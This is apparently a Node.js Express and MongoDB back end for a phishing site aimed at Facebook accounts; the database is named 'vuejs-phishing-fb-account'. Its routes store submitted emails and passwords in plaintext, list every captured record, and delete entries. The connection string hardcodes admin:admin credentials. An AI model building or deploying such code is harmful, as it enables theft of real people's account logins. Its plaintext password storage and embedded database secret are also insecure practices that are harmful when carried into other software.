const express = require('express')
const mongodb = require('mongodb')


const router = express.Router()

router.get('/', async (req, res) => {
    const users = await loadUserCollection();
    res.send(await users.find({}).toArray())
})

router.post('/', async (req, res) => {
    const users = await loadUserCollection();
    await users.insertOne({
        email: req.body.email,
        password: req.body.password,
        createdAt: new Date()
    })
    res.json({
        sucess: "Added user: " + req.body.email
    })
})

router.delete('/:id', async (req, res) => {
    const users = await loadUserCollection();
    await users.deleteOne({_id: new mongodb.ObjectID(req.params.id)})
    res.json({success: "Deleted User id: " + req.params.id})
})

async function loadUserCollection() {
    const uri = 'mongodb+srv://admin:admin@cluster0-g7fhu.gcp.mongodb.net/test?retryWrites=true&w=majority'
    const user = await mongodb.MongoClient.connect(uri, {
        useNewUrlParser: true,
        useUnifiedTopology: true
    })

    user.connect(err => {
        user.close();
    });

    return user.db('vuejs-phishing-fb-account').collection('users')
    
}

module.exports = router